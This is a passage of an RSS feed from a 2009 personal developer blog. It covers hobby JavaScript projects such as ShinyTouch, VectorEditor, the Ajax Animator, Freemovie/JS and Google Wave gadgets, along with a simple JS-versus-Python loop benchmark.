&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-regexp&quot;&gt;//&lt;/span&gt;At &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; point, run away as the algorithm gets messy &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; hackish
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So the thing just searches from right to left up to down within the quad. When it finds a column of something that fits the rgb range of the finger that is larger than a certain threshold, it checks for a reflection from the point. If it detects a reflection then yay! it throws the data at the perspective warper (based on a python one which is based on a C# one and though it would probably be easier to port from C# to JS making long chains of derivative work is fun). If there wasnt a reflection then it logs that and if that number is larger than some othe rthreshold then it kills the scanning and goes on with it’s life. The reflection algorithm just takes the point 5 pixels to the right and assumes that would be a reflection if there was one and a point 15px above and 5px to the left (nasty stuff) and takes the hue value from their RGB values. It takes the absolute value of the difference of the hue values multiplied by 100 (or 200 in the python version) and compares it with a preset configuration variable.&lt;/p&gt;
&lt;p&gt;So now that that horrible algorithm which was just whatever came to my little totally untrained mind first. But it works semi-decently, at least for me. But you can hopefully see how nasty it’s inner workings are and it inspires people to clean it up. It’s quite a bit more readable than the Python version and only 200 lines of JS so it won’t be &lt;em&gt;too&lt;/em&gt; hard to understand.&lt;/p&gt;
&lt;p&gt;But since HTML5 has no Video capture thing for webcams, and my webcam doesn’t work with flash so I can’t use that canvas&amp;lt;-flash webcam bridge i built, uh, almost 2 years ago. So now you just get to gaze at my finger moving for like 20 seconds!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/shiny/shinytouch.html&quot;&gt;http://antimatter15.com/misc/shiny/shinytouch.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>JS vs Python</title>
      <link>http://antimatter15.com/2009/08/js-vs-python/</link>
      <pubDate>Thu, 27  Aug 2009 00:01:36 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/js-vs-python/</guid>
      <author></author>
      <description>&lt;p&gt;I sorta expected it due to the new V8, Tracemonkey, Nitro, and SquirrelFish engines. But I’m thinking of making a port of ShinyTouch to JS and I was looking into what differences it might end up as.&lt;/p&gt;
&lt;p&gt;I have to say I’m really quite suprised. It’s a simple piece of code:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;setTimeout(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; start = (&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Date&lt;/span&gt;).getTime();
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; n = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;10000000&lt;/span&gt;; i++){
        n += i;
    }
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; end = (&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Date&lt;/span&gt;).getTime();
    alert(end-start);
},&lt;span class=&quot;hljs-number&quot;&gt;5000&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Just doing a loop a huge number of times and adding some numbers. But the unscientific results are quite amazing:&lt;/p&gt;
&lt;p&gt;Python: 2640, 2110, 2000, 2190&lt;/p&gt;
&lt;p&gt;Firefox 3.0 Spidermonkey: 777, 672, 685, 665&lt;/p&gt;
&lt;p&gt;Firefox 3.5 TraceMonkey: 659, 365, 629, 629&lt;/p&gt;
&lt;p&gt;Chromium Nightly: 146, 150, 147, 152&lt;/p&gt;
&lt;p&gt;While these only test basic arithmetic and recursion, &lt;em&gt;The browser&lt;/em&gt; is 15 times &lt;em&gt;faster&lt;/em&gt; than Python, it just feels quite incredable.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch Videos</title>
      <link>http://antimatter15.com/2009/08/shinytouch-videos/</link>
      <pubDate>Wed, 26  Aug 2009 08:46:29 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/shinytouch-videos/</guid>
      <author></author>
      <description>&lt;object width=&quot;425&quot; height=&quot;344&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;http://www.youtube.com/v/DCq6tKZeoV0&amp;hl=en&amp;fs=1&amp;&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowFullScreen&quot; value=&quot;true&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowscriptaccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;&lt;embed src=&quot;http://www.youtube.com/v/DCq6tKZeoV0&amp;hl=en&amp;fs=1&amp;&quot; type=&quot;application/x-shockwave-flash&quot; allowscriptaccess=&quot;always&quot; allowfullscreen=&quot;true&quot; width=&quot;425&quot; height=&quot;344&quot;&gt;&lt;/embed&gt;&lt;/object&gt;

&lt;object width=&quot;425&quot; height=&quot;344&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;http://www.youtube.com/v/fRfRQtauvc4&amp;hl=en&amp;fs=1&amp;&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowFullScreen&quot; value=&quot;true&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowscriptaccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;&lt;embed src=&quot;http://www.youtube.com/v/fRfRQtauvc4&amp;hl=en&amp;fs=1&amp;&quot; type=&quot;application/x-shockwave-flash&quot; allowscriptaccess=&quot;always&quot; allowfullscreen=&quot;true&quot; width=&quot;425&quot; height=&quot;344&quot;&gt;&lt;/embed&gt;&lt;/object&gt;

&lt;p&gt;The first one is shot from recordMyDesktop-gtk and the second one is from Cycorder on my iPhone.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Totally failed mini-project svg-edit + svgweb</title>
      <link>http://antimatter15.com/2009/08/totally-failed-mini-project-svg-edit-svgweb/</link>
      <pubDate>Mon, 24  Aug 2009 03:01:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/totally-failed-mini-project-svg-edit-svgweb/</guid>
      <author></author>
      <description>&lt;p&gt;So I tried to get svg-edit to work with svgweb’s flash shim (IE support). Sadly, it’s a total failure!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/svgweb-svgedit/svg-editor.html?svg.render.forceflash=true&quot;&gt;http://antimatter15.com/misc/svgweb-svgedit/svg-editor.html?svg.render.forceflash=true&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I only got far enough to get drawing lines, paths, polygons and rectangles working. Ellipses and text do not work. Selecting a shape shows the tracker, but if you drag it then it just flies over to (0,0) and dies. Partly because I didn’t spend any more than an hour getting the port to work, but the issues I’ve encountered is that svgweb doesn’t implement shape.getBBox() (but it did provide shape._getX(), shape._getY(), shape._getWidth(), and shape._getHeight() so it wasn’t hard to implement that). Then was that since it’s using a flash shim, the events which they hook on the container with jQuery only show the evt.target as the &amp;lt;embed&amp;gt; which the flash resides in. But I got a strange hack where you have 2 copies of the event listeners and kill the selects from the jQuery one, but doing that makes unselecting impossible.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Future plans on VectorEditor</title>
      <link>http://antimatter15.com/2009/08/future-plans-on-vectoreditor/</link>
      <pubDate>Sun, 23  Aug 2009 05:50:19 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/future-plans-on-vectoreditor/</guid>
      <author></author>
      <description>&lt;p&gt;I don’t really care about VectorEditor, If someone finds it useful and wants to take over it, well, I’m not really updating it. Not many people are updating it, and once svgweb is mixed with svg-edit for 95% browser penetration and rotation works, it will be able to do everything VectorEditor does and more.&lt;/p&gt;
&lt;p&gt;Sure it makes the project quite fragmented, a Richdraw version, an OnlyPaths version, a VectorEditor version, and now a svg-edit one. But each one will hopefully be mostly compatible with each other (mostlyish)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Shinytouch Perspective Transform</title>
      <link>http://antimatter15.com/2009/08/shinytouch-perspective-transform/</link>
      <pubDate>Sun, 23  Aug 2009 00:25:46 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/shinytouch-perspective-transform/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;strong&gt;Shinytouch perspective transforms now work!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One big issue with ShinyTouch is that it didn’t transform points correctly, but now it has been totally resolved by stealing &lt;a href=&quot;http://wiiwhiteboard.cvs.sourceforge.net/viewvc/*checkout*/wiiwhiteboard/source/linux/perspective.py?revision=1.2&amp;amp;content-type=text%2Fplain&quot;&gt;this&lt;/a&gt; (MIT licensed) from the linux (python!) port of Wiimote Whiteboard (Johnny lee’s famous work). Now it works totally insanely awesomely, no elitists necessary.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How I Would Design The Browser 2 Addons</title>
      <link>http://antimatter15.com/2009/08/how-i-would-design-the-browser-2-addons/</link>
      <pubDate>Fri, 21  Aug 2009 00:37:55 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/how-i-would-design-the-browser-2-addons/</guid>
      <author></author>
      <description>&lt;p&gt;So I was watching Aza Raskin’s TechTalk on &lt;a href=&quot;http://www.youtube.com/watch?v=Wp5Crg_KI10&amp;amp;feature=sdig&amp;amp;et=1250769392.47&quot;&gt;Jetpack&lt;/a&gt;, and I was thinking on how I would design an extension system. I would have to say to not have one, it’s just too complex, and why restrict the sound recording functionality to a taskbar. Even worse, why fragment the API and require someone to use Flash or &amp;lt;audio&amp;gt; in the page space and have a nice jetpack.future.import(“audio”) for a taskbar?&lt;/p&gt;
&lt;p&gt;I think a good idea would to expose the power to web pages. The page could request special capabilities through a magical button dropdown or bouncy annoying notifier on a corner of the page saying permissions, populated by checkboxes of whatever features that the page wants to be able to use.&lt;/p&gt;
&lt;p&gt;I think bookmarklets are almost perfect. Adding some more greasemonkey-like features would make it just about perfect. Scripts can run with the same permissions as the page, and the page’s permissions can be granted easily by the user (and the permissions persist through refreshes and browser restarts). Again, if functionality is not supported, things can gracefully degrade with partial functionality.&lt;/p&gt;
&lt;p&gt;After that, is the idea of background tabs or alternatively, merging the statusbar type widgets into the tab bar. This is logical with everything merged into the page, and allows things to gracefully degrade if they don’t support the feature. You also get the benefits of being able to reorder remove, get info (which would be the contents of an extension page), etc. I think the interface for a plugin that operates in the background (like a gmail notifier) would be just a small tab that only has an icon, with special flag that makes it run on browser start (I think this could be one of the things for the permissions panel).&lt;/p&gt;
&lt;p&gt;So one problem I see in the way Jetpack works, is that it doesn’t easily allow you to make a jetpack that hacks another running jetpack. Sure you can “fork” it, but that defeats the purpose of extensions, rather than having extensions only 1-level deep, make it work all the way down. The easy way I see is just to use the bookmarklet philosophy, and everything can mess around with anything within the page. So if you have a GMail notifier, that came out before the tab persist feature existed, you could just add a simple bookmarklet-type-greasemonkey thing that adds something to the permissions box that says “Persist Page” and then the user could check that in order to make a background GMail Notifier that runs on browser startup.&lt;/p&gt;
&lt;p&gt;Malware is easy to fight now. Imagine if every application was forced to have a icon in the taskbar of windows at all times. Finding malware is as easy as looking for things you dont want running and closing it. And if some tab-bar autohide is to be implemented on the system, only people who are quite experienced would use 10+ extension/notifier pages and it would still be easier to recognize than finding some other strange wcultns.exe or whatever when half of the system things look like that.&lt;/p&gt;
&lt;p&gt;With these features, Browser as an OS would really make sense. I wouldn’t be suprised if Google Chrome OS implements some stuff that are similar to what I’ve listed here.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>WebWorkers + Canvas + Glif + GIFEncoder = Client Side Animated Gif Generation</title>
      <link>http://antimatter15.com/2009/08/webworkers-canvas-glif-gifencoder-client-side-animated-gif-generation/</link>
      <pubDate>Mon, 17  Aug 2009 22:17:00 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/webworkers-canvas-glif-gifencoder-client-side-animated-gif-generation/</guid>
      <author></author>
      <description>&lt;p&gt;With my super awesome PHP-&amp;gt;JS compiler that I made for Freemovie/JS, I ported GIFEncoder (the second of 2 parts of the Ajax Animator which requires a server). So with this I’m really going to be “building on the shoulder’s of giants”, since all these individual components were made by other people, I’m just mixing them up in a somewhat creative manner.&lt;/p&gt;
&lt;p&gt;Though since Glif only supports monochrome, and I’m not aware of any browser supporting canvas.toDataURL(“image/gif”).&lt;/p&gt;
&lt;p&gt;So after this awesome experimentation and my system for merging multiple GIF images into a single animated gif which is yet to be tested for reasons I will detail later.&lt;/p&gt;
&lt;p&gt;So I made it and it was cool, and then I added webworkers support, but then I realized the issue isn’t that you need webworkers, but that there was an infinite loop. Fixed it and then it works fine except for the fact that it doesn’t.&lt;/p&gt;
&lt;p&gt;So if you want to rip it’s insides apart and try salvaging the disaster, go to &lt;a href=&quot;http://antimatter15.com/misc/canvasfail/giftest.htm&quot;&gt;http://antimatter15.com/misc/canvasfail/giftest.htm&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Freemovie/JS Pure Javascript SWF Generator</title>
      <link>http://antimatter15.com/2009/08/freemovie-js-pure-javascript-swf-generator/</link>
      <pubDate>Mon, 17  Aug 2009 08:12:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/freemovie-js-pure-javascript-swf-generator/</guid>
      <author></author>
      <description>&lt;p&gt;I’m making a crude python script that translates PHP to JS rather hideously. It probably will not work on any other codebase. It was a script quickly hacked together to one purpose.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://sourceforge.net/projects/freemovie/&quot;&gt;Freemovie &lt;/a&gt;is&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FreeMovie is an SWF generator library written in PHP and ported to Ruby. FreeMovie can be used to develop Web and desktop aplications.
&lt;span style=&quot;text-decoration: line-through;&quot;&gt;Speaking of the Ruby port, I can’t find it. So if anyone finds it, I think it might be useful somewhere.&lt;/span&gt; Found it in the CVS, it’s really incomplete compared to the PHP version.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The machine translated code (Not &lt;em&gt;entirely&lt;/em&gt; autogenerated, I wrote a line or two of it) is not too hideous, the tabbing is slightly off, but it’s at least mostly readable. It was a lot worse 2 hours ago (half of the lines had indentation, other without any, debugging comments everywhere saying useless and distracting things).&lt;/p&gt;
&lt;p&gt;The translator is only 107 lines of (hideous code, though the language is beautiful, I guess if you loved JS enough, you could try running the program though &lt;a href=&quot;http://www.skulpt.org/&quot;&gt;skulpt&lt;/a&gt;) python (+ 20 or so in another file to change chr() to String.fromCharCode, etc). After that, it uses 6 PHP compatibility functions and 5 from the PHP.js project to cover the features that I’m too lazy to  put in the compiler or are just not features in JS.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/freemovie/js/demo/fm-demo-0.htm&quot;&gt;http://antimatter15.com/misc/freemovie/js/demo/fm-demo-0.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The above demo generates a flash image entirely client-side, though the resulting base64 encoded data is sent to be decoded on the server since you can’t load a SWF from a data-url. If someone finds out how, it would be cool to tell me.&lt;/p&gt;
&lt;p&gt;A big issue though, is that for some odd reason half the shapes don’t work. The ones in the demo work, but all filled shapes, and the circles/arcs do not work.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave2 A higher level Wave Gadget State API</title>
      <link>http://antimatter15.com/2009/08/wave2-a-higher-level-wave-gadget-state-api/</link>
      <pubDate>Mon, 17  Aug 2009 01:26:20 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/wave2-a-higher-level-wave-gadget-state-api/</guid>
      <author></author>
      <description>&lt;p&gt;I was working on a new little Wave State API update. It supports lists in the form of subkeys, and something very much like hierarchy and events on specific sub-nodes. This way you don’t have everything update (someone’s edits on frame 36 doesn’t matter if you’re on frame 42).&lt;/p&gt;
&lt;p&gt;Everything is namespaced under a singleton global, wave2. It includes functions like&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;listen (execute a callback when something beginning with the prefix is changed)&lt;/li&gt;
&lt;li&gt;ignore (un-listen),&lt;/li&gt;
&lt;li&gt;keys (shortcut for wave.getState().getKeys()),&lt;/li&gt;
&lt;li&gt;subkeys (get keys which begin with a certain prefix, important to the pseudo hierarchy),&lt;/li&gt;
&lt;li&gt;set (submitdelta with first arg as name and second as value),&lt;/li&gt;
&lt;li&gt;get (shortcut for wave.getState().get()&lt;/li&gt;
&lt;li&gt;reset_gadget (a simple way to empty all the data in the store)
And since it’s quite short, I’m putting it under public domain at &lt;a href=&quot;http://antimatter15.com/misc/wave/wave2.js&quot;&gt;http://antimatter15.com/misc/wave/wave2.js&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator Status</title>
      <link>http://antimatter15.com/2009/08/ajax-animator-status/</link>
      <pubDate>Mon, 17  Aug 2009 01:12:13 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/ajax-animator-status/</guid>
      <author></author>
      <description>&lt;p&gt;It’s certainly hit a milestone with the current set of modifications, IMO, it’s now, finally, after 3 years of development (Actually, nothing happened the past year), what I had envisioned.
The first parts of my April 7th, 2007 post on Liveswiffers.org.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I am working on a project to make an open-source browser based Flash Authoring system.&lt;/p&gt;
&lt;p&gt;….. The idea is to make an animation on the site, save to the site’s server, and continue working on it later. Later being able to publish it and be sort of a YouTube for Flash Animations/Applications. Another aim of this project is to be next-gen software, sure there are about 10 open source multiplatform C++ based flash IDEs out there, but none of them truely [sic] represend [sic] the future of software, or true platform independence.
Another interesting fact is that I didn’t know what YouTube was until Google bought it. But with the idea for a “YouTube for animations”, is totally possible with the new infrastructure provided by Google Wave. People can mark their waves containing the gadget as with:public, and people could search, comment, and improve animations (Though I was thinking initially on a more opensource software-like fork system, than a wiki type system which Wave is, and I’m not certain how this will work out with in the evils called the “real world” since now, Wave is still just a theory).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;What has it done which makes me think it’s reached this milestone? Well, finally, I can make stick figures and animate them as they were meant to be animated. Having multiple layers with visibility now works, and now it supports most of the beloved and mostly efficient workflow of the Flash IDE - or at least to a beginner like I was, and still am.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Visible/Invisible Frames</title>
      <link>http://antimatter15.com/2009/08/visible-invisible-frames/</link>
      <pubDate>Sat, 15  Aug 2009 00:18:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/visible-invisible-frames/</guid>
      <author></author>
      <description>&lt;p&gt;New feature, only available at this random fork of the codebase as of yet.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/VisibleInvisible%20Frames/screenshot_030_8b6y6L.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Visible/Not Visible&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Since Silk doesn’t have an icon for eye_closed.png, everyone has to suffer by seeing my artwork! muah ha ha ha….&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Working on interface for Animator/Wave</title>
      <link>http://antimatter15.com/2009/08/working-on-interface-for-animator-wave/</link>
      <pubDate>Fri, 14  Aug 2009 01:38:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/working-on-interface-for-animator-wave/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Interface of Ajax Animator as Google Wave Gadget&quot;  src=&quot;/articles/2009/Working%20on%20interface%20for%20AnimatorWave/screenshot_029_4q21Pp.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;The name field will be replaced with buttons, and zoom may or may not be scrapped. Since gadgets only take up a fraction of the page (usually) it’s designed with size in mind, which may help on other space-constrained devices like netbooks.&lt;/p&gt;
&lt;p&gt;It may have a cool feature like VectorEditor’s demo where you can draw off the canvas area.&lt;/p&gt;
&lt;p&gt;As for why the tabs are now on top and the timeline is on the bottom, there’s no reason, I just think that that layout is more aesthetic.&lt;/p&gt;
&lt;p&gt;And I might name it something other than the ajax animator, something just like Animator or something&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator Updates</title>
      <link>http://antimatter15.com/2009/08/ajax-animator-updates/</link>
      <pubDate>Thu, 13  Aug 2009 23:41:56 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/ajax-animator-updates/</guid>
      <author></author>
      <description>&lt;p&gt;I’m going to soon upload the first update to the Ajax Animator in over a year. It is basically VectorEditor integration, and is not an actual update, but a fork of the project.&lt;/p&gt;
&lt;p&gt;Ideally VectorEditor (as a far simpler and smaller project), is more stable and the Recovery systems which are quite prominent in the v0.20.x. So the recovery mechanisms are not implemented.&lt;/p&gt;
&lt;p&gt;Feature wise, the version has very few new features. It has a few new features like fill opacity and line opacity, and showing multiple layers. But apart from that, there is almost nothing.&lt;/p&gt;
&lt;p&gt;It is &lt;em&gt;not&lt;/em&gt; format compatible with r13 (v0.20.x) of the format, so importing from those will not work.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>I GOT A GOOGLE WAVE INVITE!</title>
      <link>http://antimatter15.com/2009/08/i-got-a-google-wave-invite/</link>
      <pubDate>Thu, 13  Aug 2009 00:02:21 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/i-got-a-google-wave-invite/</guid>
      <author></author>
      <description>&lt;p&gt;IM STILL WAITING TO GET MY ACCOUNT BUT I JUST GOT AN INVITE AND IM SOOO HAPPY!!!!!!!!!!! SEE? LOOK I’M USING CAPS LOCK TO EXPRESS MY HAPPYNESS! IT’S REALLY REALLY REALLY AWESOME EVEN THOUGH I HAVENT ACTUALLY TRIED IT OUT YET! BUT ITS SOOOO COOL! AND LETS BE HONEST, AT LEAST THIS POST ISNT IN COMIC SANS MS.&lt;/p&gt;
&lt;p&gt;EDIT: i got my wave account. It’s cool, but there’s nobody to talk to.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>VectorEditor on Wave</title>
      <link>http://antimatter15.com/2009/08/vectoreditor-on-wave/</link>
      <pubDate>Wed, 12  Aug 2009 03:00:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/vectoreditor-on-wave/</guid>
      <author></author>
      <description>&lt;p&gt;So I don’t actually have wave yet, but for all 2 of you (likely less) who have used &lt;a href=&quot;http://pygowave.p2k-network.org/waves/&quot;&gt;pygowave&lt;/a&gt;, an &lt;a href=&quot;http://code.google.com/p/pygowave-server/&quot;&gt;open source &lt;/a&gt;third party implementation of the &lt;a href=&quot;http://www.waveprotocol.org/&quot;&gt;wave protocol&lt;/a&gt;. So there was how I developed it, I read through the APIs and tested on pygowave. So what does VectorEditor do that &lt;a href=&quot;http://code.google.com/p/svg-edit/&quot;&gt;svg-edit&lt;/a&gt; and… erm… &lt;a href=&quot;http://www.hokstad.com/static/wave/gadgets.html&quot;&gt;svg-edit&lt;/a&gt; don’t do?&lt;/p&gt;
&lt;p&gt;First, VectorEditor for wave is &lt;em&gt;really really&lt;/em&gt; real time. Waaay more real time than svg-edit (not really). But VectorEdit (VectorWave might be a nice name.. I’m going to try using that name from now on in this post) transmits the data such as even &lt;strong&gt;while&lt;/strong&gt; the shape is still being drawn, rotated, or moved (rotation needs work). Another nice feature is that the transitions are animated so things are even more seamless.&lt;/p&gt;
&lt;p&gt;Another important feature is shape locking. So when someone selects a shape, it gets locked and can’t be edited by anyone else. If anyone tries, an alert box appears saying “Shape shape:5sdfwef98dfe3ssdf is locked by user antimatter15@pygowave.p2k-network.org”. svg-edit (the latter) doesn’t support moving things after they’re created so it doesn’t really matter then, and I’m quite certain the former doesn’t do any type of locking.&lt;/p&gt;
&lt;p&gt;And lets not forget the likely most important, yet totally untested feature that seperates VectorEditor from the rest: IE support, which is inherent since it uses Raphael for rendering, but &lt;a href=&quot;http://www.theregister.co.uk/2009/06/03/google_svg_internet_explorer/&quot;&gt;it may not be necessary&lt;/a&gt; since google may be making some shim-type system of hacking svg awesomeness onto IE and making the whole VectorEditor project useless.&lt;/p&gt;
&lt;p&gt;So if you want to try it out, go to pygowave, sign up, create a wave and add the&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google Wave Gadget API &quot;Flaws&quot;</title>
      <link>http://antimatter15.com/2009/08/google-wave-gadget-api-flaws/</link>
      <pubDate>Wed, 12  Aug 2009 02:38:36 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/google-wave-gadget-api-flaws/</guid>
      <author></author>
      <description>&lt;p&gt;Edit: This post is mostly crap. I figured out how to solve my problems while writing this. But I’m posting it anyway because I feel obligated to spam the internet with my outdated thoughts&lt;/p&gt;
&lt;p&gt;One of the main features of Google Wave is the ability to do live concurrent realtime editing. Sadly, this functionality isn’t easy or as far as I know even possible on Google Wave.
Most of the time it doesn’t matter. The only time it would matter is if you are using live concurrent text editing within the gadget. Of course, that’s what I tried doing and that’s why i’m writing this blog post.
So I still haven’t gotten my Google Wave Invite yet (hope soon!) so I’m experimenting with the pygowave project, which is a third party open source implementation of the Wave Protocol. The interface is missing something that is quite important to wave: multi-user text editing. So I decided to try implementing it as a Wave Gadget.&lt;/p&gt;
&lt;p&gt;I really did understimate it’s complexity. While implementing isn’t usually too hard, the structure of the Wave Gadget API makes it more difficult than it could/should be. What the wave gadget API does is it has a real time updating key-value table. It’s quite flexible and useable most of the time, but for real time editing, not quite as useful as when something is changed.&lt;/p&gt;
&lt;p&gt;For instance, if 2 people are editing the same thing, then whoever submits the data last is the one which wrote the data and the first person’s edits are ignored. Very rarely do 2 people &lt;em&gt;need&lt;/em&gt; to edit the exact same thing. But when they do, it’s not easy to merge the things. A more chat-like system could work.&lt;/p&gt;
&lt;p&gt;But while implementing that chat-type system on top of Wave is possible, it feels very inefficent, partly due to everything being cached at all states (to support Playback) and worry about something akin to garbage collection to delete things after everyone has patched their running copy.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>VectorEditor Updates lines, rotation, more</title>
      <link>http://antimatter15.com/2009/08/vectoreditor-updates-lines-rotation-more/</link>
      <pubDate>Mon, 10  Aug 2009 06:23:12 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/vectoreditor-updates-lines-rotation-more/</guid>
      <author></author>
      <description>&lt;p&gt;During the last two days I worked a bit on my cross platform, Raphael based vector graphics editor. It now supports Firefox, Opera, Chrome, probably Safari and magically, something called IE. Yes, it works on that nasty terror.
Really, the project started with just the idea of being able to support IE. Sure it has a few neat features (multiple select mainly), but the fundamental idea is to support IE and to do so in a stable manner.
It’s actually running quite well in IE, though only the latest version has been tested.&lt;/p&gt;
&lt;p&gt;Among the updates is a new delete tool that is far more flexible and powerful. It is now not just a button but an entire tool. So while you can still click on it to delete your current selection, you can also use the tool to click on shapes or drag and delete whole groups (not sure what that thing is called). It even has a nice red tint to signify deleting.
There is also event listening, vX support (it only uses events and position), and selecting fill, stroke, stroke opacity, fill opacity, and stroke width.&lt;/p&gt;
&lt;p&gt;It also integrates well into the Ajax Animator in an almost drop-in replacement type. Maybe eventually something to choose between VectorEditor and Onlypaths. The really only bug features there are multiple select and drag and line editing.&lt;/p&gt;
&lt;p&gt;Lines are now done almost perfectly. Dragging them works perfectly and it shows two little boxes on the ends that fan be dragged to edit. This vastly simplifies the old issues with lines and stick figures. Stick figures that inherently satisfy me a lot because that was the highes level of animation I ever did.&lt;/p&gt;
&lt;p&gt;It’s probably a bad thing that the developer od an animation application never did anything more complex than stick figures, and probably makes it seem strange for me to even start it. But anyone with more knowledge of animation would not be so naiive as to attempt this.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jsvectoreditor.googlecode.com/svn/trunk/index.html&quot;&gt;http://jsvectoreditor.googlecode.com/svn/trunk/index.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google Chrome OS</title>
      <link>http://antimatter15.com/2009/08/google-chrome-os/</link>
      <pubDate>Tue, 04  Aug 2009 05:18:15 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/google-chrome-os/</guid>
      <author></author>
      <description>&lt;p&gt;The idea of a Web Browser as the OS is nothing new, and most people know it. As for current things, they’re basically very restricted normal operating systems. &lt;a href=&quot;http://googleblog.blogspot.com/2009/07/introducing-google-chrome-os.html&quot;&gt;Google &lt;/a&gt;wouldn’t do something like that without tons of innovation and killer features.&lt;/p&gt;
